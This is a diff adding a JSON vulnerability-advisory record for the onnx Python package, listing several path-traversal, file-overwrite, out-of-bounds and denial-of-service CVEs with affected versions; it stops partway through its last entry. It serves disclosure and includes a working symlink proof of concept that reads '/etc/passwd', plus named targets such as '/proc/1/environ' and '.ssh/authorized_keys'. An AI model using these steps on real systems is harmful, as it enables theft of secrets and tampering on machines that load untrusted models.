@@ -1,0 +1,1919 @@
+{
+  "schema_version": 1,
+  "package": "onnx",
+  "purls": [
+    "pkg:pypi/onnx"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 31,
+  "advisories": [
+    {
+      "id": "GHSA-3r9x-f23j-gc73",
+      "primary_id": "CVE-2026-27489",
+      "aliases": [
+        "CVE-2026-27489"
+      ],
+      "cve_ids": [
+        "CVE-2026-27489"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "onnx Vulnerable to Path Traversal via Symlink",
+      "details": "### Summary\nA path traversal vulnerability via symlink allows to read arbitrary files outside model or user-provided directory. \n\n### Details\nThe following check for symlink is ineffective and it is possible to point a symlink to an arbitrary location on the file system:\nhttps://github.com/onnx/onnx/blob/336652a4b2ab1e530ae02269efa7038082cef250/onnx/checker.cc#L1024-L1033\n\n`std::filesystem::is_regular_file` performs a `status(p)` call on the provided path, which follows symbolic links to determine the file type, meaning it will return true if the target of a symlink is a regular file. \n\n\n### PoC\n\n\n\n```python\n# Create a demo model with external data\nimport os\nimport numpy as np\nimport onnx\nfrom onnx import helper, TensorProto, numpy_helper\n\ndef create_onnx_model(output_path=\"model.onnx\"):\n    weight_matrix = np.random.randn(1000, 1000).astype(np.float32)\n\n    X = helper.make_tensor_value_info(\"X\", TensorProto.FLOAT, [1, 1000])\n    Y = helper.make_tensor_value_info(\"Y\", TensorProto.FLOAT, [1, 1000])\n    W = numpy_helper.from_array(weight_matrix, name=\"W\")\n\n    matmul_node = helper.make_node(\"MatMul\", inputs=[\"X\", \"W\"], outputs=[\"Y\"], name=\"matmul\")\n\n    graph = helper.make_graph(\n        nodes=[matmul_node],\n        name=\"SimpleModel\",\n        inputs=[X],\n        outputs=[Y],\n        initializer=[W]\n    )\n\n    model = helper.make_model(graph, opset_imports=[helper.make_opsetid(\"\", 11)])\n    onnx.checker.check_model(model)\n\n    data_file = output_path.replace('.onnx', '.data')\n\n    if os.path.exists(output_path):\n        os.remove(output_path)\n    if os.path.exists(data_file):\n        os.remove(data_file)\n\n    onnx.save_model(\n        model,\n        output_path,\n        save_as_external_data=True,\n        all_tensors_to_one_file=True,\n        location=os.path.basename(data_file),\n        size_threshold=1024 * 1024\n    )\n\nif __name__ == \"__main__\":\n    create_onnx_model(\"model.onnx\")\n```\n\n1. Run the above code to generate a sample model with external data.\n2. Remove `model.data`\n3. Run `ln -s /etc/passwd model.data`\n4. Load the model using the following code\n5. Observe check for symlink is bypassed and model is succesfuly loaded\n\n```python\nimport onnx\nfrom onnx.external_data_helper import load_external_data_for_model\n\ndef load_onnx_model_basic(model_path=\"model.onnx\"):\n    model = onnx.load(model_path)\n    return model\n\ndef load_onnx_model_explicit(model_path=\"model.onnx\"):\n    model = onnx.load(model_path, load_external_data=False)\n    load_external_data_for_model(model, \".\")\n    return model\n\nif __name__ == \"__main__\":\n    model = load_onnx_model_basic(\"model.onnx\")\n\n```\n\nA common misuse case for successful exploitation is that an adversary can provide victim with a compressed file, containing `poc.onnx` and `poc.data (symlink)`. Once the victim uncompress and load the model, symlink read the adversary selected arbitrary file.\n\n\n### Impact\n\nRead sensitive and arbitrary files and environment variable (e.g. /proc/1/environ) from the host that loads the model.\n\nNOTE: this issue is not limited to UNIX.\n\n### Sample patch\n\n```c\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <errno.h>\n\nint open_external_file_no_symlink(const char *base_dir,\n                                  const char *relative_path) {\n    int dirfd = -1;\n    int fd = -1;\n    struct stat st;\n\n    // Open base directory\n    dirfd = open(base_dir, O_RDONLY | O_DIRECTORY);\n    if (dirfd < 0) {\n        return -1;\n    }\n\n    // Open the target relative to base_dir\n    // O_NOFOLLOW => fail if final path component is a symlink\n    fd = openat(dirfd,\n                relative_path,\n                O_RDONLY | O_NOFOLLOW);\n    close(dirfd);\n\n    if (fd < 0) {\n        // ELOOP is the typical error if a symlink is encountered\n        return -1;\n    }\n\n    // Inspect the *opened file*\n    if (fstat(fd, &st) != 0) {\n        close(fd);\n        return -1;\n    }\n\n    // Enforce \"regular file only\"\n    if (!S_ISREG(st.st_mode)) {\n        close(fd);\n        errno = EINVAL;\n        return -1;\n    }\n\n    // fd is now:\n    // - not a symlink\n    // - not a directory\n    // - not a device / FIFO / socket\n    // - race-safe\n    return fd;\n}\n```\n\n### Resources\n\n* https://cwe.mitre.org/data/definitions/61.html\n* https://discuss.secdim.com/t/input-validation-necessary-but-not-sufficient-it-doesnt-target-the-fundamental-issue/1172\n* https://discuss.secdim.com/t/common-pitfalls-for-patching-path-traversal/3368",
+      "published": "2026-03-31T22:34:25Z",
+      "modified": "2026-04-06T16:48:02.670078Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-3r9x-f23j-gc73"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27489"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/4755f8053928dce18a61db8fec71b69c74f786cb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-3r9x-f23j-gc73",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-538c-55jv-c5g9",
+      "primary_id": "CVE-2026-34445",
+      "aliases": [
+        "CVE-2026-34445"
+      ],
+      "cve_ids": [
+        "CVE-2026-34445"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "ONNX: Malicious ONNX models can crash servers by exploiting unprotected object settings.",
+      "details": "### Summary\nThe ExternalDataInfo class in ONNX was using Python\u2019s setattr() function to load metadata (like file paths or data lengths) directly from an ONNX model file. The problem? It didn\u2019t check if the \"keys\" in the file were valid. Because it blindly trusted the file, an attacker could craft a malicious model that overwrites internal object properties.\n\n### Why its Dangerous\n**Instant Crash DoS**: An attacker can set the length property to a massive number like 9 petabytes. When the system tries to load the model, it attempts to allocate all that RAM at once, causing the server to crash or freeze Out of Memory.\n\n**Access Bypass**: By setting a negative offset -1, an attacker can trick the system into reading parts of a file it wasn't supposed to touch.\n\n**Object Corruption**: Attackers can even inject \"dunder\" attributes like __class__ to change the object's type entirely, which could lead to more complex exploits.\n\n**Fixed**: https://github.com/onnx/onnx/pull/7751 object state corruption and DoS via ExternalDataInfo attribute injection",
+      "published": "2026-04-01T21:10:52Z",
+      "modified": "2026-04-04T00:14:20.465133958Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-538c-55jv-c5g9"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34445"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/7751"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/e30c6935d67cc3eca2fa284e37248e7c0036c46b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-538c-55jv-c5g9",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-6rq9-53c3-f7vj",
+      "primary_id": "CVE-2024-5187",
+      "aliases": [
+        "CVE-2024-5187",
+        "CVE-2025-51480"
+      ],
+      "cve_ids": [
+        "CVE-2024-5187",
+        "CVE-2025-51480"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "onnx allows Arbitrary File Overwrite in download_model_with_test_data",
+      "details": "A vulnerability in the `download_model_with_test_data` function of the onnx/onnx framework, versions before 1.16.2, allow for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability enables attackers to overwrite any file on the system, potentially leading to remote code execution, deletion of system, personal, or application files, thus impacting the integrity and availability of the system. The issue arises from the function's handling of tar file extraction without performing security checks on the paths within the tar file, as demonstrated by the ability to overwrite the `/home/kali/.ssh/authorized_keys` file by specifying an absolute path in the malicious tar file.",
+      "published": "2024-06-06T21:30:37Z",
+      "modified": "2025-10-09T22:12:15.124706Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-5187"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/issues/6215"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/6145"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/6222"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/releases/tag/v1.16.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://huntr.com/bounties/50235ebd-3410-4ada-b064-1a648e11237e"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-6rq9-53c3-f7vj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1"
+      ]
+    },
+    {
+      "id": "GHSA-cmw6-hcpp-c6jp",
+      "primary_id": "CVE-2026-34446",
+      "aliases": [
+        "CVE-2026-34446"
+      ],
+      "cve_ids": [
+        "CVE-2026-34446"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "ONNX: Arbitrary File Read via ExternalData Hardlink Bypass in ONNX load",
+      "details": "### Summary\nThe issue is in `onnx.load` \u2014 the code checks for symlinks to prevent path traversal, but completely misses hardlinks, which is the problem, since a hardlink looks exactly like a regular file on the filesystem.\n\n### The Real Problem\nThe validator in `onnx/checker.cc` only calls `is_symlink()` and never checks the inode or `st_nlink`, so a hardlink walks right through every security check without any issues.\n\n### Impact\nEspecially dangerous in AI supply chain scenarios like HuggingFace \u2014 a single malicious model is enough to silently steal secrets from the victim's machine without them noticing anything.",
+      "published": "2026-04-01T21:13:37Z",
+      "modified": "2026-04-04T00:14:20.384367331Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-cmw6-hcpp-c6jp"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34446"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/4755f8053928dce18a61db8fec71b69c74f786cb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-cmw6-hcpp-c6jp",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-ffxj-547x-5j7c",
+      "primary_id": "CVE-2022-25882",
+      "aliases": [
+        "CVE-2022-25882",
+        "PYSEC-2023-38"
+      ],
+      "cve_ids": [
+        "CVE-2022-25882"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "Directory Traversal in onnx",
+      "details": "Versions of the package onnx before 1.13.0 are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory, for example \"../../../etc/passwd\"",
+      "published": "2023-01-26T21:30:25Z",
+      "modified": "2025-04-01T21:59:48.038629Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25882"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/issues/3991"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/4400"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/f369b0e859024095d721f1d1612da5a8fa38988d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/jnovikov/02a9aff9bf2188033e77bd91ff062856"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/blob/96516aecd4c110b0ac57eba08ac236ebf7205728/onnx/checker.cc%23L129"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2023-38.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-2395479"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-ffxj-547x-5j7c",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0"
+      ]
+    },
+    {
+      "id": "GHSA-h36j-8vv3-cj52",
+      "primary_id": "CVE-2024-7776",
+      "aliases": [
+        "CVE-2024-7776",
+        "PYSEC-2025-10"
+      ],
+      "cve_ids": [
+        "CVE-2024-7776"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "Open Neural Network Exchange (ONNX) Path Traversal Vulnerability",
+      "details": "A vulnerability in the `download_model` function of the onnx/onnx framework, before and including version 1.16.1, allows for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability can be exploited by an attacker to overwrite files in the user's directory, potentially leading to remote command execution.",
+      "published": "2025-03-20T12:32:46Z",
+      "modified": "2025-03-27T17:52:58.403634Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-7776"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/6222"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2025-10.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://huntr.com/bounties/a7a46cf6-1fa0-454b-988c-62d222e83f63"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h36j-8vv3-cj52",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.17.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2"
+      ]
+    },
+    {
+      "id": "GHSA-h8wv-9h96-m4hr",
+      "primary_id": "CVE-2024-27319",
+      "aliases": [
+        "CVE-2024-27319",
+        "PYSEC-2024-223"
+      ],
+      "cve_ids": [
+        "CVE-2024-27319"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "Onnx Out-of-bounds Read vulnerability",
+      "details": "Versions of the package onnx before and including 1.15.0 are vulnerable to Out-of-bounds Read as the ONNX_ASSERT and ONNX_ASSERTM functions have an off by one string copy.",
+      "published": "2024-02-23T18:30:59Z",
+      "modified": "2026-02-04T04:29:23.699256Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27319"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/08a399ba75a805b7813ab8936b91d0e274b08287"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2024-223.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FGTBH5ZYL2LGYHIJDHN2MAUURIR5E7PY"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TFJJID2IZDOLFDMWVYTBDI75ZJQC6JOL"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h8wv-9h96-m4hr",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0"
+      ]
+    },
+    {
+      "id": "GHSA-hqmj-h5c6-369m",
+      "primary_id": "CVE-2026-28500",
+      "aliases": [
+        "CVE-2026-28500"
+      ],
+      "cve_ids": [
+        "CVE-2026-28500"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "ONNX Untrusted Model Repository Warnings Suppressed by silent=True in onnx.hub.load() \u2014 Silent Supply-Chain Attack",
